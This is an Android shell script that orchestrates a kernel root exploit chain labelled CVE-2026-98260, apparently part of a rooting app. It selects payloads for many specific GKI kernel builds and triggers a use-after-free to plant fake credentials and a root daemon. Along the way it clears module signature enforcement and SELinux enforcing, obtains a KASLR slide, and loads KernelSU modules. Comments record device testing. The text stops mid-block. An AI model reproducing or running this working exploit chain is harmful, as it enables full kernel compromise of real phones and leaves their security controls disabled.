#!/system/bin/sh
# CVE-2026-98260 complete root chain (opt-in).
# Validated chain: kprobe-free UAF -> fake cred -> rootd -> su98260.
#
# Invoked by $D/run.sh only when MAGICROOT_CHAIN=98260 and
# MAGICROOT_ENABLE_98260=1 (the app sets these after explicit confirmation).
# Success proof: rootd socket exists and su98260 returns uid=0 with
# /proc/self/status Uid/Gid all zero.  The exploit/rootd process is left
# running on success (do not kill it).

set -u

# 2026-10-31 13:07 真机日志里，主脚本自己调用 sleep/tr/tee 时报
# "inaccessible or not found"，导致心跳空转、sig_enforce 与 SELinux 都没能还原。
# 原因还没坐实（PATH 在某处被清掉），这里先强制设回，关键命令再用绝对路径兜底。
PATH=/system/bin:/system/xbin:/data/adb/ksu/bin
export PATH
echo "98260_PATH=$PATH sh=$(command -v sh 2>/dev/null || echo ?)"

D=/data/local/tmp/magic
SOCK=/data/local/tmp/pc98260-root.sock
LOG=$D/98260.log
VERIFY=$D/98260-verify.log
VERIFY_RAW=$D/98260-verify.raw
KERNEL=$(uname -r 2>/dev/null || echo unknown)
# g264 keeps the proven g264 inputs.  g7d keeps the proven upstream ksu6157/
# helper set but uses M6 for the actual handoff.  The other 6.1.x builds use
# the remapped CGA module and g264 helper binaries; they must never enter the
# g264 ksu_prepare/ksu-loader branch, whose absolute symbol table is g264-only.
KSU_HANDOFF_LEGACY=0
case "$KERNEL" in
    6.1.157-android14-11-g2646292297b1*)
        KSU6157_DIR=$D/ksu6157-g264
        KSU_HANDOFF_LEGACY=1 ;;
    6.1.157-android14-11-g7d3922fade43*)
        KSU6157_DIR=$D/ksu6157 ;;
    6.1.*-android14-11-*)
        KSU6157_DIR=$D/ksu6157-g264 ;;
    *) KSU6157_DIR=$D/ksu6157 ;;
esac
KMI=$(printf '%s' "$KERNEL" | sed -n 's/.*android\([0-9][0-9]*\).*/android\1/p')-$(printf '%s' "$KERNEL" | cut -d. -f1,2)
[ -n "$KMI" ] || KMI=android16-6.12
echo "98260_KMI=$KMI"

# ---- 6.1.157 专版：模块签名强制是本链最关键的一次性开关 ----------------
# 这颗内核 module_param 是 bool_enable_only：root 也清不掉 sig_enforce，
# 只能由载荷用同一个 UAF 写零。清零发生在**确认拿到 root 之后**，所以
# 一次失败的提权不会留下任何被降级的内核状态；载入结束（成功或失败）
# 立刻由 ksu-loader 写回 1。
case "$KERNEL" in
    6.1.*-android14-11-*) K6157=1 ;;
    *) K6157=0 ;;
esac
# g7d 额外标记：M6 越狱的 8 个 ko 全是这颗构建的 vermagic，g264 用不了。
case "$KERNEL" in
    6.1.157-android14-11-g7d3922fade43*) G7D=1 ;;
    *) G7D=0 ;;
esac
SIG_ORIG=""
if [ "$K6157" = "1" ]; then
    SIG_ORIG=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null | tr -d ' \r\n')
fi
SIG_WANT=0
if [ "$K6157" = "1" ] && [ "${MAGICROOT_98260_KSU:-1}" != "0" ]; then
    # 别再用 shell 读到的值来开关：真机日志里这一行是 before=? —— shell(uid 2000)
    # 读 /sys/module/module/parameters/sig_enforce 会被拒，于是 will_clear=0，
    # 签名强制根本没清，模块必然被拒。改成总是交给 exploit 自己读、自己判断：
    # 它拿到 root 后读到的才是真值（before=Y 才清，本来就是 N 就跳过）。
    SIG_WANT=1
fi
echo "98260_SIG_ENFORCE=before=${SIG_ORIG:-?} will_clear=$SIG_WANT"

# 6.1.157 上 real_cred 的第二发 UAF 从来没装上过（真机日志里 r= 一直停在
# 4294967168/4294967178 这种 reap 垃圾值），每发都是一次多余的内核写。
# init_module 判的是 capable(CAP_SYS_MODULE)（有效 cred），ksud 读 getuid()
# 也走 cred，所以这颗内核干脆跳过 real_cred 修复，少扰动内核。
REAL_CRED_ARG=""
[ "$K6157" = "1" ] && REAL_CRED_ARG="--no-real-cred"


# Same-boot parked guard.  A failed UAF deliberately leaves the exploit parent
# alive; killing/reaping it can trip posix_cpu_timers_exit.  Never start a
# second plant in the same boot.  The marker stores only boot_id so clean.sh
# can compare it without parsing a PID.
PARKED_MARKER=/data/local/tmp/.magicroot-98260-parked
[ -f "$D/lib.sh" ] && . "$D/lib.sh"
parked_check() {
    [ -f "$PARKED_MARKER" ] || return 0
    _b=$(sed -n '1p' "$PARKED_MARKER" 2>/dev/null | tr -d ' \r\n')
    _cur=$(current_boot_id)
    if [ -n "$_b" ] && [ "$_b" = "$_cur" ]; then
        echo "FAIL=98260_parked_reboot_required marker=$PARKED_MARKER boot=$_b"
        echo "HINT=UAF failed earlier in this boot; reboot. Do NOT kill the parked exploit and do NOT start a second plant."
        restore_enforcing_after_fail
        echo "98260_CHAIN_END=FAIL code=80"
        exit 80
    fi
    rm -f "$PARKED_MARKER" 2>/dev/null || true
    echo "98260_PARKED_STALE=1 removed_boot=$_b current_boot=$_cur"
}
UAF_STARTED=0
trap 'if [ "${SIG_WANT:-0}" = "1" ]; then sig_restore_6157 || true; fi; if [ "${UAF_STARTED:-0}" = "1" ]; then parked_mark; fi' EXIT
trap 'if [ "${SIG_WANT:-0}" = "1" ]; then sig_restore_6157 || true; fi; if [ "${UAF_STARTED:-0}" = "1" ]; then parked_mark; fi; exit 80' INT TERM HUP

# The rootd client is an interactive sh; its prompt prefixes every line.
# Strip only the prompt so "0" / "Uid: 0 0 0 0" can be parsed reliably.
#
# rootd 是 bind() 之后马上 listen()，但 socket 文件在 bind 那一刻就出现了：
# 脚本用 `[ -S $SOCK ]` 判断"rootd 起来了"，随后第一次 connect() 正好落在
# bind 与 listen() 之间，拿到 ECONNREFUSED。以前只试一次，于是一次**成功的
# 提权**被判成 FAIL=proof uid_not_zero；接着 restore_enforcing_after_fail 也连不上，
# SELinux 就留在 Permissive —— 真机表现为各种 App 黑屏、整机自己重启。
# 现在只在"连接类错误"上重试，拿到真实答案（哪怕是个错答案）就停。
verify_su() {
    _v_n=0
    _v_timeout=0
    _v_cmd='id -u; id -g; getenforce; cat /proc/self/status | grep -E "Uid|Gid"'
    while :; do
        if command -v timeout >/dev/null 2>&1; then
            timeout -s KILL 15 "$SU" -c "$_v_cmd" > "$VERIFY_RAW" 2>&1
            _v_rc=$?
        else
            "$SU" -c "$_v_cmd" > "$VERIFY_RAW" 2>&1
            _v_rc=$?
        fi
        sed 's/^[^#]*# //' "$VERIFY_RAW" > "$VERIFY" 2>/dev/null \
            || cp "$VERIFY_RAW" "$VERIFY"
        awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY" && break
        # A stale listener can accept the connection but never answer (for
        # example a parked plant whose rootd child is gone).  Without a
        # timeout the interactive rootd client waits forever and the app log
        # stops right after 98260_ROOTD_RETRY, with no FAIL marker.
        if [ "$_v_rc" = "124" ] || [ "$_v_rc" = "137" ]; then
            _v_timeout=1
            echo "98260_ROOTD_TIMEOUT=1 attempt=$_v_n"
            break
        fi
        grep -qiE 'connection refused|no such file or directory|cannot connect|failed to connect' \
            "$VERIFY_RAW" || break
        _v_n=$((_v_n + 1))
        if [ "$_v_n" -gt 120 ]; then break; fi
        [ "$_v_n" = 1 ] && echo "98260_ROOTD_RETRY=1 reason=connect_refused"
        [ -x /system/bin/sleep ] && /system/bin/sleep 1 || sleep 1
    done
    [ "$_v_n" -gt 0 ] && [ "$_v_timeout" = "0" ] &&
        echo "98260_ROOTD_RETRY_DONE attempts=$_v_n"
    # attempts 打满或 rootd 客户端超时：把 exploit 的日志尾巴捞出来再判，别让
    # rootd 的 bind 失败/崩溃被吞成一句 Connection refused（g264 首跑 18:48 的教训）。
    if [ "$_v_n" -gt 120 ] || [ "$_v_timeout" = "1" ]; then
        echo "98260_ROOTD_GIVEUP=1 tail_of_exploit_log:"
        tail -n 25 "$LOG" 2>/dev/null || true
    fi
}


# /proc/modules 是 0400 root，shell(uid 2000) 读不到；KSU 是否 Live 必须问 rootd。
# 直接读失败时用 $SU 探一次，杜绝"其实已加载却报 failed"的假失败。
ksu_live() {
    grep -q '^kernelsu ' /proc/modules 2>/dev/null && return 0
    if [ -x "$SU" ]; then
        _kl=$("$SU" -c 'grep -q "^kernelsu " /proc/modules && echo live' 2>/dev/null | tr -d '\r')
        case "$_kl" in *live*) return 0 ;; esac
    fi
    if [ -x /data/adb/ksu/bin/su ]; then
        _kl=$(timeout 5 /data/adb/ksu/bin/su -c 'grep -q "^kernelsu " /proc/modules && echo live' 2>/dev/null | tr -d '\r')
        case "$_kl" in *live*) return 0 ;; esac
    fi
    return 1
}

# sig_enforce 还原。bool_enable_only 只拒绝"清 0"，写 1 永远是允许的，
# 所以只要还剩一条 root 通道（rootd / KSU su）就能把状态还回去。
sig_param_set_6157() {
    [ -x "$KSU6157_DIR/sigparam" ] || return 1
    "$KSU6157_DIR/sigparam" 1 2>/dev/null | /system/bin/grep -q 'sig_enforce=Y' && return 0
    if [ -x "$SU" ]; then
        "$SU" -c "!$KSU6157_DIR/sigparam 1" 2>/dev/null | /system/bin/grep -q 'sig_enforce=Y' && return 0
    fi
    for _s in /data/adb/ksu/bin/su /system/bin/su; do
        [ -x "$_s" ] || continue
        "$_s" -c "$KSU6157_DIR/sigparam 1" 2>/dev/null | /system/bin/grep -q 'sig_enforce=Y' && return 0
    done
    return 1
}
sig_restore_6157() {
    [ "${SIG_WANT:-0}" = "1" ] || return 0
    # 用 shell 内建 read 取 sysfs，不经 cat/tr —— init_module 挂住后 exec 会失效，
    # 只有纯内建还能读文件。
    _sig_cur=""
    IFS= read -r _sig_cur < /sys/module/module/parameters/sig_enforce 2>/dev/null || true
    [ "${_sig_cur:-}" = "Y" ] && return 0
    # g264：rootd 已被模块切断；用 ksud debug su 通道恢复 sig_enforce
    if [ "${KSU_METHOD:-}" = "g264-cga" ] && [ -n "${KSUD:-}" ] && [ -x "$KSUD" ] \
       && [ -x "$KSU6157_DIR/sigparam" ]; then
        _sig_out=$(printf '!%s 1\n' "$KSU6157_DIR/sigparam" | timeout 10 "$KSUD" debug su 2>/dev/null | tr -d ' \r\n')
        case "$_sig_out" in
            *sig_enforce=Y*)
                echo "98260_SIG_ENFORCE=Y restored=1 via=ksud-debug-su"
                return 0 ;;
        esac
    fi
    if sig_param_set_6157; then
        echo "98260_SIG_ENFORCE=Y restored=1 from=${_sig_cur:-?}"
        return 0
    fi
    echo "98260_SIG_ENFORCE_RESTORE_FAIL=1 current=${_sig_cur:-?} hint=reboot_restores_sig_enforce"
    return 1
}

# 失败退出时尽量把 SELinux 拉回 Enforcing。98260 在装假 cred 的同一次 UAF 里
# 把 selinux_state->enforcing 清零；如果最后没拿到可用的 root，就没有任何通道
# 能改回来，整机停在 Permissive —— 真机上表现就是 App 进去黑屏/无响应。
# 只要还有 rootd socket（daemon 的 euid 已经是 0，哪怕 uid 校验没过）就试一次。
restore_enforcing_after_fail() {
    [ "${K6157:-0}" = "1" ] || return 0
    case "$(/system/bin/cat /sys/fs/selinux/enforce 2>/dev/null)" in
        1) return 0 ;;
    esac
    if [ -S "$SOCK" ] && [ -x "$SU" ]; then
        _rt=1
        while [ "$_rt" -le 3 ]; do
            _re=$("$SU" -c 'setenforce 1 2>/dev/null; getenforce' 2>/dev/null \
                  | /system/bin/tail -1 | /system/bin/tr -d ' \r\n')
            case "$_re" in
                Enforcing)
                    echo "98260_SELINUX_RESTORED=1 reason=after_fail try=$_rt"
                    return 0 ;;
            esac
            _rt=$((_rt + 1))
            [ "$_rt" -le 3 ] && { [ -x /system/bin/sleep ] && /system/bin/sleep 1 || sleep 1; }
        done
    fi
    echo "98260_SELINUX_LEFT_PERMISSIVE=1 hint=reboot_now_apps_may_black_screen"
}

wait_for_su_provider() {
    _i=0
    while [ "$_i" -lt 30 ]; do
        for _c in su /data/adb/ksu/bin/su /system/bin/su; do
            case "$_c" in
                /*) [ -x "$_c" ] || continue ;;
                *) command -v "$_c" >/dev/null 2>&1 || continue ;;
            esac
            _u=$(timeout 3 "$_c" -c 'id -u' 2>&1 | tr -d ' \r\n')
            if [ "$_u" = "0" ]; then
                echo "98260_SU_PROVIDER=ready path=$_c attempts=$_i"
                export KSU_SU_PROVIDER="$_c"
                return 0
            fi
            case "$_u" in
                *unknown*provider*|*Unknown*Provider*)
                    echo "98260_SU_PROVIDER_ERROR=unknown_su_provider path=$_c out=$_u" ;;
            esac
        done
        _i=$((_i + 1))
        sleep 1
    done
    echo "98260_SU_PROVIDER=unavailable attempts=$_i"
    return 1
}

ATTEMPTS=$(num_or "${MAGICROOT_98260_ATTEMPTS:-}" 6)
CHURN_ROUNDS=$(num_or "${MAGICROOT_98260_CHURN_ROUNDS:-}" 8)
CHURN_PER_CPU=$(num_or "${MAGICROOT_98260_CHURN_PER_CPU:-}" 32)
WAIT_CAP=$(num_or "${MAGICROOT_98260_WAIT_CAP:-}" 8)
BUDGET=$(num_or "${MAGICROOT_98260_BUDGET_S:-}" 180)
CUSTOM_KO=${MAGICROOT_CUSTOM_KO:-${MAGICROOT_98260_CUSTOM_KO:-}}

echo "98260_CHAIN_BEGIN kernel=$KERNEL time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"
# 上一次是怎么关的：kernel_panic / watchdog / hardreset / reboot…。
# 手机自己重启后，先看这一行就知道是不是内核崩了。
echo "98260_BOOT_REASON=$(getprop ro.boot.bootreason 2>/dev/null)/$(getprop sys.boot.reason 2>/dev/null) boot_id=$(cut -c1-8 /proc/sys/kernel/random/boot_id 2>/dev/null)"

P6157=""
case "$KERNEL" in
    "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k")
        B=$D/98260 ;;
    "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k")
        B=$D/98260-6138 ;;
    "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k")
        B=$D/98260-6123 ;;
    "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k")
        B=$D/98260-6138y ;;
    "6.6.118-android15-8-g554929766a0d-abogki544555896-4k")
        B=$D/98260-g554 ;;
    "6.6.118-android15-8-gf17133276a57-abogki518694926-4k")
        B=$D/98260-f171 ;;
    "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k")
        B=$D/98260-61821 ;;
    "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k")
        B=$D/98260-61821-brm ;;
    "6.1.157-android14-11-g2646292297b1"*)
        P6157=g264 ;;
    "6.1.157-android14-11-gaaa383620ebf"*)
        P6157=gaaa ;;
    "6.1.157-android14-11-g3306a328b7be"*)
        P6157=g3306 ;;
    "6.1.157-android14-11-g84ffa64b710b"*)
        P6157=g84 ;;
    "6.1.157-android14-11-g77f76e323a02"*)
        P6157=g77f ;;
    "6.1.157-android14-11-g7d3922fade43"*)
        P6157=6157 ;;
    "6.1.157-android14-11-g8d63307071ad"*)
        P6157=g8d6 ;;
    "6.1.99-android14-11-gce84935796c9"*)
        P6157=gce849 ;;
    "6.1.99-android14-11-g5859fbdbad8c"*)
        P6157=g5859 ;;
    "6.1.99-android14-11-g54d40b4fb287"*)
        P6157=g54d ;;
    "6.1.128-android14-11-g40b1fd119d9b"*)
        P6157=g40b1 ;;
    "6.1.128-android14-11-g8a4968670f1c"*)
        P6157=g8a496 ;;
    "6.1.128-android14-11-g2e1f0741dafb"*)
        P6157=g2e1f ;;
    "6.1.99-android14-11-ge9da27488f45"*)
        P6157=ge9da ;;
    *)
        echo "FAIL=kernel_unsupported actual=$KERNEL"
        echo "98260_CHAIN_END=FAIL code=71"
        exit 71 ;;
esac

if [ "$K6157" = "1" ]; then
    B=$D/98260-$P6157
fi

if [ -f "$B/target.sh" ]; then
    . "$B/target.sh"
    if [ -n "${CHAIN_98260_KERNEL:-}" ] && [ "$CHAIN_98260_KERNEL" != "$KERNEL" ]; then
        echo "FAIL=target_kernel_mismatch target=$CHAIN_98260_KERNEL actual=$KERNEL dir=$B"
        exit 71
    fi
fi

# CGA base module / patched output is derived from the exact 6.1 profile.
G264_BASE=$D/g264/ksm-g264-base.ko
G264_KO=$D/ksm-g264.ko
if [ "$K6157" = "1" ] && [ "$G7D" = "0" ]; then
    G264_BASE=$D/g264/ksm-$P6157-base.ko
    G264_KO=$D/ksm-$P6157.ko
fi

BIN=$B/exploit-android-key-ptr
# pc98260-su is byte-identical across the 6.6 builds; keep one common copy.
SU=$B/pc98260-su
[ -x "$SU" ] || SU=$D/pc98260-su
[ -x "$BIN" ] || { echo "FAIL=asset_missing $BIN"; exit 73; }
[ -x "$SU" ] || { echo "FAIL=asset_missing $SU"; exit 73; }

# Verify deployed bytes, not just the APK's source assets.  Each exact 6.1
# profile has a fixed row count covering its payload, CGA/M6 handoff and shared
# su tools.  Missing rows/files/tools are hard failures before any UAF starts.
verify_6157_integrity() {
    _im=$D/6157-integrity.tsv
    [ -f "$_im" ] || { echo "FAIL=asset_integrity_manifest_missing path=$_im"; return 1; }
    command -v sha256sum >/dev/null 2>&1 || {
        echo "FAIL=asset_integrity_tool_missing tool=sha256sum"; return 1;
    }
    case "$P6157" in
        6157) _want=23 ;;
        g264) _want=14 ;;
        *) _want=11 ;;
    esac
    _n=0
    while IFS="$(printf '\t')" read -r _ip _path _expected; do
        case "$_ip" in ''|'#'*) continue ;; esac
        [ "$_ip" = "$P6157" ] || continue
        case "$_path" in ''|/*|*..*|*' '*)
            echo "FAIL=asset_integrity_path profile=$P6157 path=$_path"; return 1 ;;
        esac
        if [ "${#_expected}" != "64" ]; then
            echo "FAIL=asset_integrity_manifest profile=$P6157 path=$_path"; return 1
        fi
        case "$_expected" in *[!0-9a-f]*)
            echo "FAIL=asset_integrity_manifest profile=$P6157 path=$_path"; return 1 ;;
        esac
        [ -f "$D/$_path" ] || {
            echo "FAIL=asset_missing profile=$P6157 path=$_path"; return 1;
        }
        _actual=$(sha256sum "$D/$_path" 2>/dev/null | awk '{print $1}')
        [ "$_actual" = "$_expected" ] || {
            echo "FAIL=asset_hash profile=$P6157 path=$_path expected=$_expected actual=$_actual"
            return 1
        }
        _n=$((_n + 1))
    done < "$_im"
    if [ "$_n" != "$_want" ]; then
        echo "FAIL=asset_integrity_count profile=$P6157 expected=$_want actual=$_n"
        return 1
    fi
    echo "98260_ASSET_INTEGRITY=ok profile=$P6157 files=$_n"
    return 0
}
if [ "$K6157" = "1" ]; then
    if ! verify_6157_integrity; then
        echo "98260_CHAIN_END=FAIL code=74"
        exit 74
    fi
fi

# Read-only preflight mode: only --check, no UAF.
if [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ]; then
    echo "98260_PREFLIGHT=1"
    "$BIN" --check
    RC=$?
    echo "98260_CHAIN_END=PREFLIGHT code=$RC"
    exit "$RC"
fi

# HOneClick-style external KASLR slide for the g928 6.18 profile.
# The 98260 binary's built-in tracefs sampler returns empty samples on this
# kernel; HOneClick's grab.sh + kaslr_slide uses sched_blocked_reason instead.
# Explicit MAGICROOT_98260_SLIDE still wins, and internal sampling remains the
# fallback if the helper cannot run.
SLIDE_ARG=""
case "$B" in
    "$D/98260-61821")
        if [ -n "${MAGICROOT_98260_SLIDE:-}" ]; then
            SLIDE_ARG="--slide $MAGICROOT_98260_SLIDE"
            echo "98260_SLIDE_SOURCE=explicit value=$MAGICROOT_98260_SLIDE"
        elif [ "${MAGICROOT_98260_EXTERNAL_SLIDE:-1}" = "1" ] &&
             [ -x "$B/grab_slide_618.sh" ] && [ -x "$B/kaslr_slide" ] &&
             [ -x "$B/forker_618" ]; then
            _slide_log=$D/98260-slide.log
            : > "$_slide_log" 2>/dev/null || true
            echo "98260_SLIDE_GRAB_BEGIN helper=$B/grab_slide_618.sh"
            _slide_out=$(sh "$B/grab_slide_618.sh" "$B" 2>&1)
            printf '%s\n' "$_slide_out" >> "$_slide_log" 2>/dev/null || true
            printf '%s\n' "$_slide_out"
            _slide=$(printf '%s\n' "$_slide_out" | sed -n 's/^KASLR_SLIDE=//p' | head -1)
            _votes=$(printf '%s\n' "$_slide_out" | sed -n 's/^KASLR_VOTES=//p' | head -1)
            case "$_slide" in
                0x*)
                    SLIDE_ARG="--slide $_slide"
                    echo "98260_SLIDE_SOURCE=external value=$_slide votes=${_votes:-unknown}"
                    ;;
                *)
                    echo "98260_SLIDE_GRAB_FAILED reason=no_slide log=$_slide_log"
                    ;;
            esac
        else
            echo "98260_SLIDE_GRAB=disabled reason=helper_missing"
        fi
        ;;
esac

# ---------------------------------------------------------------------------
# Abnormal-reboot evidence: arm a rootd-backed watcher before the KSU handoff.
# The watcher is a separate session because the chain intentionally leaves the
# exploit/rootd process parked; it writes to the 777 work dir so a post-reboot
# shell (without root) can still retrieve the previous boot's files.
# ---------------------------------------------------------------------------
cat > "$D/reboot-watch.sh" <<'REBOOT_WATCH_EOF'
#!/system/bin/sh
# Rootd-backed reboot watcher (bounded).
# Writes into /data/local/tmp/magic/reboot-watch/<boot_id>/.
set -u
D=${1:-/data/local/tmp/magic}
KERNEL=${2:-$(uname -r)}
WATCH_SECONDS=${3:-900}
case "$WATCH_SECONDS" in ''|*[!0-9]*) WATCH_SECONDS=900 ;; esac
[ "$WATCH_SECONDS" -ge 60 ] 2>/dev/null || WATCH_SECONDS=60
[ "$WATCH_SECONDS" -le 3600 ] 2>/dev/null || WATCH_SECONDS=3600
BOOT=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || date +%s)
DIR="$D/reboot-watch/$BOOT"
mkdir -p "$DIR" 2>/dev/null || exit 1
chmod 777 "$D/reboot-watch" "$DIR" 2>/dev/null || true
umask 022
if [ -f "$DIR/watcher.pid" ]; then
  _old=$(cat "$DIR/watcher.pid" 2>/dev/null)
  [ -n "$_old" ] && [ -d "/proc/$_old" ] && exit 0
fi
echo $$ > "$DIR/watcher.pid" 2>/dev/null || true
exec >> "$DIR/watch.log" 2>&1
echo "WATCH_BEGIN $(date -Iseconds 2>/dev/null || date)"
echo "WATCH_BOOT_ID=$BOOT"
echo "WATCH_KERNEL=$KERNEL"
echo "WATCH_SECONDS=$WATCH_SECONDS"
echo "WATCH_PID=$$"
cat /proc/version 2>/dev/null
cat /proc/cmdline 2>/dev/null
echo "WATCH_DIR=$DIR"

END=$(( $(date +%s 2>/dev/null || echo 0) + WATCH_SECONDS ))
DPID=""; LPID=""; SPID=""; KPID=""
cleanup_watch() {
  [ -n "$DPID" ] && kill "$DPID" 2>/dev/null || true
  [ -n "$LPID" ] && kill "$LPID" 2>/dev/null || true
  [ -n "$SPID" ] && kill "$SPID" 2>/dev/null || true
  [ -n "$KPID" ] && kill "$KPID" 2>/dev/null || true
}
trap 'cleanup_watch; echo "WATCH_STOPPED $(date -Iseconds 2>/dev/null || date) signal"; exit 0' TERM INT

# Prefer dmesg -w; fall back to a bounded poll.
(
  dmesg -w 2>/dev/null || (
    while [ "$(date +%s 2>/dev/null || echo 0)" -lt "$END" ]; do
      dmesg 2>/dev/null
      sleep 30
    done
  )
) > "$DIR/dmesg.log" 2>&1 &
DPID=$!

# Cap logcat lines; -m makes it exit instead of growing forever.
(
  logcat -b all -v threadtime -m 20000 2>&1
) > "$DIR/logcat.log" 2>&1 &
LPID=$!

# Non-log state snapshots, bounded.
(
  while [ "$(date +%s 2>/dev/null || echo 0)" -lt "$END" ]; do
    echo "=== $(date -Iseconds 2>/dev/null || date) ==="
    uptime
    cat /proc/loadavg 2>/dev/null
    free 2>/dev/null
    ps -A 2>/dev/null | head -80
    cat /proc/modules 2>/dev/null | head -40
    sleep 15
  done
) > "$DIR/state.log" 2>&1 &
SPID=$!

# /proc/kmsg carries kernel messages that dmesg may drop.
(
  cat /proc/kmsg 2>&1
) > "$DIR/kmsg.log" 2>&1 &
KPID=$!

echo "WATCH_CHILDREN=dmesg,logcat,state,kmsg"
while [ "$(date +%s 2>/dev/null || echo 0)" -lt "$END" ]; do
  sleep 30
done
cleanup_watch
wait 2>/dev/null || true
echo "WATCH_END $(date -Iseconds 2>/dev/null || date)"
REBOOT_WATCH_EOF
chmod 755 "$D/reboot-watch.sh" 2>/dev/null || true
start_reboot_watch() {
    if [ "${MAGICROOT_REBOOT_WATCH:-0}" != "1" ]; then
        echo "98260_REBOOT_WATCH=disabled"
        return 0
    fi
    [ -x "$SU" ] || { echo "98260_REBOOT_WATCH=skip reason=no_rootd_client"; return 0; }
    _watch_seconds=${MAGICROOT_REBOOT_WATCH_SECONDS:-900}
    case "$_watch_seconds" in ''|*[!0-9]*) _watch_seconds=900 ;; esac
    "$SU" -c "nohup sh '$D/reboot-watch.sh' '$D' '$KERNEL' '$_watch_seconds' >/dev/null 2>&1 &" >/dev/null 2>&1
    _watch_rc=$?
    if [ "$_watch_rc" = "0" ]; then
        echo "98260_REBOOT_WATCH=armed via=rootd script=$D/reboot-watch.sh dir=$D/reboot-watch"
    else
        echo "98260_REBOOT_WATCH=arm_failed rc=$_watch_rc"
    fi
}

# Reuse an already working persistent root provider before consuming this
# boot's single UAF attempt.  A mere /dev/su file is not proof: require an
# actual uid=0 command with a bounded timeout, through both common su paths
# and the selected/bundled ksud driver channel.  Keep this 6.1-only: the
# shared runner's other release branches retain their existing state machine.
# Probe output goes to a file rather than a pipeline, so a timed-out provider
# cannot keep the shell waiting on a root-side child that inherited stdout.
if [ "$K6157" = "1" ]; then
    _er_out=$D/.existing-root-$$.out
    existing_root_su_probe() {
        rm -f "$_er_out"
        timeout -k 1 6 "$@" > "$_er_out" 2>/dev/null
        grep -q 'uid=0' "$_er_out" 2>/dev/null
    }
    existing_root_ksud_probe() {
        rm -f "$_er_out"
        printf 'id\n' | timeout -k 1 6 "$1" debug su > "$_er_out" 2>/dev/null
        grep -q 'uid=0' "$_er_out" 2>/dev/null
    }
    existing_root_verified=0
    existing_root_provider=""
    for _er in /dev/su /system_ext/bin/su /system/xbin/su /system/bin/su /vendor/bin/su; do
        [ -x "$_er" ] || continue
        if existing_root_su_probe "$_er" -c id; then
            existing_root_verified=1
            existing_root_provider=$_er
            break
        fi
    done
    if [ "$existing_root_verified" = "0" ]; then
        _path_su=$(command -v su 2>/dev/null)
        if [ -n "$_path_su" ] && [ -x "$_path_su" ] \
                && existing_root_su_probe "$_path_su" -c id; then
            existing_root_verified=1
            existing_root_provider=$_path_su
        fi
    fi
    if [ "$existing_root_verified" = "0" ]; then
        for _ek in "${MAGICROOT_KSUD:-}" "$D/ksu6157-g264/ksud" "$D/ksu6157-m6/ksud_resukisu"; do
            [ -n "$_ek" ] && [ -x "$_ek" ] || continue
            if existing_root_ksud_probe "$_ek"; then
                existing_root_verified=1
                existing_root_provider=$_ek
                break
            fi
        done
    fi
    rm -f "$_er_out"
    if [ "$existing_root_verified" = "1" ]; then
        echo "98260_EXISTING_ROOT=verified provider=$existing_root_provider uid=0"
        echo "98260_CHAIN_END=OK reason=already_rooted"
        exit 0
    fi
fi

# If a previous UAF failed in this boot, refuse before even reusing a socket.
parked_check

# If a live rootd already exists from a previous run, verify it first.
if [ -S "$SOCK" ] && [ -x "$SU" ] && pidof exploit-android-key-ptr >/dev/null 2>&1; then
    verify_su
    if awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY"; then
        start_reboot_watch
        printf '%s' "$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)" > "$D/.98260-success" 2>/dev/null
        echo "98260_SUCCESS=1 reused=1"
        echo "98260_SU=$SU"
        echo "98260_ROOTD_SOCK=$SOCK"
        cat "$VERIFY"
        echo "98260_CHAIN_END=OK"
        exit 0
    fi
fi

# A live plant with no usable socket is a parked zombie from a previous
# attempt.  Starting another plant would leak another full-cap process and
# make the next panic/debug state ambiguous.  Leave it parked; reboot.
if pidof exploit-android-key-ptr >/dev/null 2>&1; then
    parked_mark
    echo "FAIL=rootd_live_without_usable_socket sock=$SOCK pid=$(pidof exploit-android-key-ptr 2>/dev/null)"
    echo "HINT=reboot required; do not start a second plant and do not SIGKILL the parked process"
    restore_enforcing_after_fail
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi

rm -f "$SOCK" 2>/dev/null || true

# ---------------------------------------------------------------------------
# 1.0.31：g264 的 KASLR slide 预检。
#   1.0.30 在 GT-2 上死在 [slide] sample empty：exploit 连 UAF 都没开始，
#   但脚本的 EXIT trap 仍写了 parked，白白烧掉一次开机。
#   这里先跑 --check --quick 看 tracefs/trigger/event；再跑最多 3 次 --check
#   尝试拿到 slide；拿不到就用 dmesg 的 "Kernel Offset:" 兜底；全拿不到就
#   直接退出（不启动 UAF、不写 parked），允许同一开机稍后再试。
#   g7d 不走这段（那边 trace 一直正常）。
# ---------------------------------------------------------------------------
if [ "$K6157" = "1" ] && [ "$G7D" = "0" ] && [ -z "$SLIDE_ARG" ]; then
    _qj=$D/98260-check-quick.json
    "$BIN" --check --quick > "$_qj" 2>/dev/null || true
    _qj_txt=$(cat "$_qj" 2>/dev/null)
    echo "98260_SLIDE_PREFLIGHT=$_qj_txt"
    _ev=$(printf '%s\n' "$_qj_txt" | sed -n 's/.*"event":\([0-9]*\).*/\1/p' | tail -1)
    _tr=$(printf '%s\n' "$_qj_txt" | sed -n 's/.*"trigger":\([0-9]*\).*/\1/p' | tail -1)
    _tf=$(printf '%s\n' "$_qj_txt" | sed -n 's/.*"tracefs":\([0-9]*\).*/\1/p' | tail -1)
    echo "98260_SLIDE_TRACEFS tracefs=${_tf:-?} trigger=${_tr:-?} event=${_ev:-?}"

    _dmesg_slide() {
        _off=$(dmesg 2>/dev/null | sed -n 's/.*Kernel Offset: 0x\([0-9a-fA-F]*\).*/\1/p' | head -1)
        case "$_off" in ""|0|0000000000000000) return 1 ;; esac
        # 2 MiB 对齐：低 21 位必须为 0
        _low=$((0x$_off & 0x1FFFFF)) 2>/dev/null || return 1
        [ "$_low" = "0" ] || return 1
        printf '0x%s' "$_off"
    }

    if [ "${_tf:-0}" = "0" ] || [ "${_tr:-0}" = "0" ]; then
        _ds=$(_dmesg_slide 2>/dev/null) || _ds=""
